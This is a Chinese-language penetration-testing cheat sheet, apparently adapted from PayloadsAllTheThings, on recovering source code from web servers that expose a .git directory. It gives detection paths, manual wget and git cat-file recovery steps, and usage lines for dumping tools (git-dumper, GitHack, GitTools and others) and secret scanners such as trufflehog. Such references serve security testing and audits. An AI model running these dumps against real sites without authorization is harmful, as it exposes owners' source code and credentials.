# Git Source Code Leak - Git源码泄露利用

[SEARCH_KEYWORDS]
漏洞类型: Git Leak Source Code Leak Git源码泄露 .git目录暴露
攻击类型: Source Code Disclosure Information Leakage Credential Exposure
关键词: .git git objects HEAD logs index commit tree blob
技术: Git Object Recovery Commit History Tree Walk Index Parsing
路径: /.git/config /.git/HEAD /.git/logs/HEAD /.git/objects/

[CONTENT]

## Git源码泄露概述

当.git目录暴露在Web服务器上时，攻击者可以恢复整个源代码仓库，获取敏感信息和凭证。

## 检测方法

检查以下文件是否存在：

- `.git/config`
- `.git/HEAD`
- `.git/logs/HEAD`

## 手动恢复

### 从.git/logs/HEAD恢复

1. 查看.git/logs/HEAD获取commit历史：

```powershell
0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
```

2. 下载commit对象：

```powershell
wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
mkdir .git/objects/26
mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
```

3. 遍历tree对象获取文件列表

4. 下载并读取文件内容

### 从.git/index恢复

使用gin解析index文件：

```powershell
pip3 install gin
gin ~/git-repo/.git/index

$ gin .git/index | egrep -e "name|sha1"
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98
```

## 自动化工具

### git-dumper

```powershell
pip install -r requirements.txt
./git-dumper.py http://web.site/.git ~/website
```

### diggit

```powershell
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
```

### rip-git

```powershell
perl rip-git.pl -v -u "http://web.site/.git/"
git cat-file -p 07603070376d63d911f608120eb4b5489b507692
```

### GitHack

```powershell
GitHack.py http://web.site/.git/
```

### GitTools

```powershell
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
git checkout -- .
```

## 秘密收割工具

### noseyparker

```ps1
noseyparker scan --datastore np.noseyparker --git-url https://github.com/user/repo
```

### trufflehog

```powershell
truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git
```

### Gitleaks

```powershell
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Source Code Management/Git.md